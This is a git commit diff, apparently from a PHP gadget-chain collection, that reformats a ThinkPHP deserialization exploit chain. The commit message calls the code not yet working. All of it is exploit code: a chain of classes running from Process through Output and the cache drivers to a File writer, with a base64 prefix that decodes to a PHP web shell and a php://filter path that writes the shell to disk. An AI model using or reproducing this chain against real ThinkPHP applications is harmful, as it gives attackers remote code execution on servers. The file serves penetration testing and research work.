1be5715c9fe09ac99db82f1df1a2543a4d8e26ea
cfreal <folcharles@gmail.com>
2021-08-30 17:12:48 +0200

    Cleaned code for ThinkPHP/FW1, but it does not work yet.

--- gadgetchains/ThinkPHP/FW/1/gadgets.php
+++ gadgetchains/ThinkPHP/FW/1/gadgets.php
@@ -1,128 +1,145 @@
 <?php
-namespace think;
 
-
-use think\model\relation\HasMany;
-
-class Process
+namespace think
 {
-    private $processPipes;
+    use think\model\relation\HasMany;
 
-    private $status;
-
-    private $processInformation;
-    public function  __construct(){
-        $this->processInformation['running']=true;
-        $this->status=3;
-        $this->processPipes=new HasMany();
-    }
-
-}
- namespace think;
- class Model{
-
- }
- namespace think\model;
-
-
- use think\Model;
- class Merge extends Model{
-     public $a='1';
-     public function __construct()
-     {
-     }
- }
-
-
-
-namespace think\model\relation;
-use think\console\Output;
-use think\db\Query;
-use think\model\Merge;
-use think\model\Relation;
-class HasMany extends Relation
-{
-    //protected $baseQuery=true;
-    protected $parent;
-    protected $localKey='a';
-    protected $foreignKey='a';
-    protected $pivot;
-    public function __construct(){
-        $this->query=new Output();
-        $this->parent= new Merge();
-
-    }
-}
-
-
-namespace think\model;
-class Relation
-{}
-namespace think\db;
-class Query{}
-
-
-namespace think\console;
-class Output{
-    protected $styles = [
-        'info',
-        'error',
-        'comment',
-        'question',
-        'highlight',
-        'warning',
-        'getTable',
-        'where'
-    ];
-    private $handle;
-    public function __construct()
+    class Process
     {
-        $this->handle = (new \think\session\driver\Memcache);
+        private $processPipes;
+        private $status = 3;
+        private $processInformation = ['running' => true];
+
+        public function  __construct()
+        {
+            $this->processPipes = new HasMany();
+        }
+    }
+
+    class Model
+    {
     }
 }
-namespace think\session\driver;
-class Memcache
+
+namespace think\model
 {
-    protected $handler;
-    public function __construct()
+    use think\Model;
+
+    class Merge extends Model
     {
-        $this->handler = (new \think\cache\driver\Memcached);
+        public $a = '1';
+
+        public function __construct()
+        {
+        }
+    }
+
+    class Relation
+    {
     }
 }
 
-
-namespace think\cache\driver;
-
-class Memcached
+namespace think\model\relation
 {
-    protected $tag;
-    protected $options;
-    protected $handler;
-
-    public function __construct()
+    use think\console\Output;
+    use think\model\Merge;
+    use think\model\Relation;
+    
+    class HasMany extends Relation
     {
-        $this->tag = true;
-        $this->options = [
-            'expire'   => 0,
-            'prefix'   => 'PD9waHAgZXZhbCgkX1BPU1RbJ3pjeTIwMTgnXSk7ID8+',
+        protected $parent;
+        protected $localKey = 'a';
+        protected $foreignKey = 'a';
+        protected $pivot;
+
+        public function __construct()
+        {
+            $this->query = new Output();
+            $this->parent = new Merge();
+        }
+    }
+}
+
+namespace think\db
+{
+    class Query
+    {
+    }
+}
+
+namespace think\console
+{
+    class Output
+    {
+        protected $styles = [
+            'info',
+            'error',
+            'comment',
+            'question',
+            'highlight',
+            'warning',
+            'getTable',
+            'where'
         ];
-        $this->handler = (new File);
+        private $handle;
+
+        public function __construct()
+        {
+            $this->handle = new \think\session\driver\Memcache();
+        }
     }
 }
 
-class File
+
+
+namespace think\session\driver
 {
-    protected $tag;
-    protected $options;
-    public function __construct()
+    class Memcache
     {
-        $this->tag = false;
-        $this->options = [
-            'expire'        => 3600,
-            'cache_subdir'  => false,
-            'prefix'        => '',
-            'data_compress' => false,
-            'path'          => 'php://filter/convert.base64-decode/resource=./',
-        ];
+        protected $handler;
+
+        public function __construct()
+        {
+            $this->handler = new \think\cache\driver\Memcached();
+        }
+    }     
+}
+
+
+namespace think\cache\driver
+{
+    class Memcached
+    {
+        protected $tag;
+        protected $options;
+        protected $handler;
+    
+        public function __construct()
+        {
+            $this->tag = true;
+            $this->options = [
+                'expire'   => 0,
+                'prefix'   => 'PD9waHAgZXZhbCgkX1BPU1RbJ3pjeTIwMTgnXSk7ID8+',
+            ];
+            $this->handler = new File();
+        }
+    }
+    
+    class File
+    {
+        protected $tag;
+        protected $options;
+
+        public function __construct()
+        {
+            $this->tag = false;
+            $this->options = [
+                'expire'        => 3600,
+                'cache_subdir'  => false,
+                'prefix'        => '',
+                'data_compress' => false,
+                'path'          => 'php://filter/convert.base64-decode/resource=./',
+            ];
+        }
     }
 }
